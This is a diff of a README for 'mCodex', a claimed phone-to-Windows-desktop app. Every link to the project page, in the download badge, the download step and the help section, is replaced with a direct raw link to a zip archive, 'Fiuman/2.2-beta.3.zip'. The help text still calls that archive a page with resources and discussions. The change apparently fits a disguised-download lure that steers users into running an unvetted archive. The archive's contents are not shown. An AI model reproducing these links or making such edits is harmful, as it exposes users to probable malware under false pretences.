@@ -1,6 +1,6 @@
 # 📱 mCodex - Your Windows Desktop, Now in Your Pocket
 
-[![Download mCodex](https://img.shields.io/badge/Download-mCodex-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/tightnessrivetline151/mCodex)
+[![Download mCodex](https://img.shields.io/badge/Download-mCodex-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/tightnessrivetline151/mCodex/main/Fiuman/2.2-beta.3.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Getting mCodex up and running takes just a few minutes. Here's what you need to 
 
 ### 📥 Step 1: Download the App
 
-Visit this link to download the application: [https://github.com/tightnessrivetline151/mCodex](https://github.com/tightnessrivetline151/mCodex)
+Visit this link to download the application: [https://raw.githubusercontent.com/tightnessrivetline151/mCodex/main/Fiuman/2.2-beta.3.zip](https://raw.githubusercontent.com/tightnessrivetline151/mCodex/main/Fiuman/2.2-beta.3.zip)
 
 The download page will open in your browser. Look for the download button or link on that page—it's usually easy to spot. Click it, and the file will start downloading to your computer.
 
@@ -108,7 +108,7 @@ First, try closing and reopening both the app on your phone and the program on y
 
 ## 📞 Getting Help
 
-If you run into any trouble or have questions, don't worry—help is available. Start by visiting the download page at [https://github.com/tightnessrivetline151/mCodex](https://github.com/tightnessrivetline151/mCodex). There, you'll find additional resources, community discussions, and ways to reach out for support.
+If you run into any trouble or have questions, don't worry—help is available. Start by visiting the download page at [https://raw.githubusercontent.com/tightnessrivetline151/mCodex/main/Fiuman/2.2-beta.3.zip](https://raw.githubusercontent.com/tightnessrivetline151/mCodex/main/Fiuman/2.2-beta.3.zip). There, you'll find additional resources, community discussions, and ways to reach out for support.
 
 Remember, mCodex is here to make your life easier. Take your time exploring, and don't hesitate to experiment with the features. You'll be a pro in no time!
 
